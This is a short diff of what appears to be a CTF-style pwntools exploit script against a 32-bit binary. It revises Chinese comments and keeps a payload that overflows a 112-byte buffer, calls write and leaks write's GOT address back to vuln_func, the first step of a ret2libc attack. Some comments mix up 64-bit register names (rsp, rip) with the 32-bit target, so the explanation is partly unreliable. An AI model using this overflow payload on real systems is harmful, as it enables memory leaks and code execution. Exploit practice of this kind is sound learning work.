@@ -9,9 +9,9 @@ libc = ELF('/lib/i386-linux-gnu/libc.so.6')
 # 反编译得知
 vuln_func = 0x8049172
 
-# 这边溢出return_address 变为write 返回地址变为vuln_func 然后继续溢出做write的arg 就是0 stdout wirte的got 然后写入8字节
+# 这边溢出return_address 变为write 返回地址变为vuln_func(write属于系统调用 返回地址就是将syscall的下一条指令入栈  
+# 就是在当前rsp处，这里pop rip 后就是rsp 所以紧跟着write ) 然后继续溢出做write的arg 就是0:stdout wirte的got 然后写4字节
 # 此处可以这么理解溢出后vuln返回实际做的操作pop localvar 然后pop rbp 恢复callers rbp但是此处应该是被污染了 然后pop rip 就是将write给了rip 
-# 此时系统默认当前栈是write的caller
 payload1 = b'A'*112+p32(elf.sym['write'])+p32(vuln_func)+p32(1)+p32(elf.got['write'])+p32(4)
 
 io.send(payload1)
